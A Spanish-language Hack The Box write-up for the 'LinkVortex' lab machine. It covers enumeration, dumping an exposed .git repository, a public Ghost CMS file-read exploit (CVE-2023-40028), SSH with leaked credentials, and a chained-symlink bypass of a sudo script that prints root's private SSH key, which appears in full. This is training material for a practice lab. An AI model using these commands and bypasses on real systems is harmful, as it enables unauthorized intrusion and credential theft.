---
title: LinkVortex - Easy (HTB)
tags:
permalink: /LinkVortex-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.10.11.47    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 01:32 EDT
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 01:33 (0:00:00 remaining)
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.27s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  tcpwrapped
|_http-server-header: Apache
|_http-generator: Ghost 5.58
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-title: BitByBit Hardware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.26 seconds
```

# Service enumeration

## Puerto 80

![1_KBB8uZ8ZItIrBbebmcnqPg](images/1_KBB8uZ8ZItIrBbebmcnqPg.webp)

El escaneo de `nmap` nos revela que en el puerto `80`el cual parece ser un servicio `http` se aloja un `robots.txt`el cual puede contener informacion valiosa. La pagina principal de por si no tiene nada de informacion por lo que directamente vamos a ver el contenido de la ruta donde se aloja el `robots.txt`.

![image-center](/assets/images/Untitled 6 1.jpg)

Nos informa de rutas de la pagina.

- La ruta `ghost` nos redirigue a un panel de login.

![image-center](/assets/images/Untitled 7 1.jpg)

- La ruta `/r` y `/p` no nos lleva a ningun lado, ya que nos devuelven un codigo de estado `404` de **page not found**
- Lo mismo para para la ruta `/email`
- La pagina corre `ghost cms` en la version 5.58 la cual es vulnerable a un `file read via simlinks`
Debido a que no tenemos credenciales podemos enumerar la ruta `ghost` , a pesar de no tener nada de informacion en una de la rutas, vemos que nos redirige a una pagina de `aadmin` pero al ver el codigo fuente vemos que hace alucion a `admin@linkvortex.htb`

## Gobuster enumeration

#### Directory enumeration

```bash 
gobuster dir -u http://linkvortex.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -x php,txt,js,html,bak,php.bak,zip --exclude-length 0
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://linkvortex.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,bak,php.bak,zip,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 179] [--> /assets/]
/robots.txt           (Status: 200) [Size: 121]
/LICENSE              (Status: 200) [Size: 1065]
```

El escaneo de `gobuster` para la busque de directorios no nos devuelve nada, asi que pasamos a buscar subdominios de la pagina.

#### Subdomain enumeration 

```bash
wfuzz -c -t 200 -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw=20
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000019:   200        115 L    255 W      2538 Ch     "dev"
```

Vemos que nos encuentra un subdominio `dev` para la pagina, lo agregamos al `/etc/hosts` para ver su contenido.

```bash 
echo -e '10.10.11.47\t\dev.linkvortex.htb' | sudo tee -a /etc/hosts
```

![image-center](/assets/images/Untitled 8 1.jpg)

Vemos que la pagina esta vacia, podriamos intentar buscar por directorios o archivos dentro de la misma.

```bash
gobuster dir -u http://dev.linkvortex.htb -w /usr/share/dirb/wordlists/common.txt -t 200 --exclude-length 0
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.linkvortex.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.git/HEAD            (Status: 200) [Size: 41]
/.hta                 (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
```

Nos encontro un `.git` en la ruta de la pagina.

![image-center](/assets/images/Untitled 9 1.jpg)

Revisando muy por arriba el contenido de esta ruta no encontramos nada interesante, pero existen herramientas como [GitHack](https://github.com/lijiejie/GitHack) la cual nos permite dumpear datos secretos u ocultos de la ruta.

Clonamos el repositorio

```bash 
git clone https://github.com/lijiejie/GitHack
```

Y ejecutamos el script pasandole la url donde se encuentra el `.git` y el directorio donde queremos depositar los resultados.

```bash 
python3 GitHack.py http://dev.linkvortex.htb/.git/ /home/zs1n/Desktop/zsln/htb/linkvortex
```

Al terminar su ejecucion nos crea una carpeta con el nombre del dominio y si entramos hay mas carpetas y un `Dockerfile.ghost` con el siguiente contenido.

```bash     
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

Dentro de la carpeta `_/GitHack/dev.linkvortex.htb/ghost/core/test/regression/api/admin` nos alojo un `authentication..test.js` que si revisamos su contenido y grepeamos por `pass` en busca de passwords, encontramos lo siguiente.

```javascript
cat authentication.test.js | grep -i "pass"
            const password = 'OctopiFociPilfer45';
```

# Explotacion

Al parecer dentro del archivo se declaran muchas variables con passwords definidas pero esta en especial es distinta a las demas, podemos verificar su auntenticidad logueandonos en la pagina.

![1_E-tvWVkklYpXuq8tU4osbA](images/1_E-tvWVkklYpXuq8tU4osbA.webp)


Nos logueamos con exito asi que podemos pasar al uso del exploit para explotar la vulnerabilidad presente en `ghosts cms`.

Clonamos el repositorio con el script
```bash 
git clone https://github.com/0xyassine/CVE-2023-40028
```

Lo ejecutamos indicandole el `user` , `password` 

```bash
**./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45**
```

Y nos pide un archivo a leer, abusando de la vulnerabilidad que tiene. Si prestamos atencion al archivo que conseguimos con `githack` (`/var/lib/ghost/config.production.json`) parece ser un archivo de configuracion de `ghost`, podriamos intentar leer su contenido aprovechando del script

```bash
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

Vemos una credenciales para el usuario `bob` y su contraseña.

```bash
ssh bob@10.10.11.47                      
The authenticity of host '10.10.11.47 (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.47' (ED25519) to the list of known hosts.
bob@10.10.11.47's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$
```

# Post-Explotacion / Privilege escalation

### Sudoers files

```bash
sudo -l 
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Vemos que usando `bash` podemos ejecutar como `root` el `/opt/ghost/clean_symlink.sh` pasandole un `.png` como argumento, revisemos el script para ver si podemos abusar de dicho script para elevar privilegios.

```bash
cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Lo que hace el script basicamente es primero setear la variable de entorno CHECK_CONTENT a False si no se declara en el comando, luego lo que hace que obtener com `$LINK` el primer argumento q le pasamos el cual chequea que sea un archivo que acabe en extension `.png`, luego a base de eso lo que hace es renonbrar por asi decir la variable `$LINK` a `$LINK_NAME` haciendo que luego con `$READ_LINK` chequea que no tenga o tenga algun tipo de symlink, y pasar a la siguiente verificacion que consiste en ver si el archivo contiee las cadenas `etc` o `root`, si las contiene las mueve a la zona de cuaretena que es la variable que se declara al principio del script y por ultimo si la variable `$CHECK_CONTENT` esta seteada a true muestra el contenido del archivo,esto lo podemos burlar, haciendo como un encadenamiento de symlinks creando primero un symlink de la clave privada de root a un zs1n.txt por ejemplo, y repitiendo el proceso pero de el .txt a un nuevo zs1n.png.
esto va generar una ruptura en la logica del script haciendo que primero detecte el symlink. lo remueva, lo que quedaria en el zs1n.txt del cual va a chequear que contenga la cadena root la cual no la tiene por ende no lo mueve  a cuarentena lo que hace q podamos buralr finalmente la logica y asi conseguir nuestro proposito

Creamos el simlink de la clave `id_rsa` de root.
```bash 
ln -s /root/.ssh/id_rsa zs1n.txt
```

Repetimos el proceso
```bash 
ln -s /home/bob/zs1n.txt zs1n.png
```

Ejecutamos el script 
```bash
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/zs1n.png 
Link found [ /home/bob/zs1n.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Nos vamos al directorio `/tmp` para crear la clave `id_rsa` con el contenido que conseguimos.

Le damos permisos de ejecucion 

```bash 
chmod 600 id_rsa
```

Y nos logueamos como root.

```bash
ssh root@localhost -i id_rsa 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Sep 22 08:27:35 2025 from 127.0.0.1
root@linkvortex:~# whoami
root
```

`~Happy Hacking.`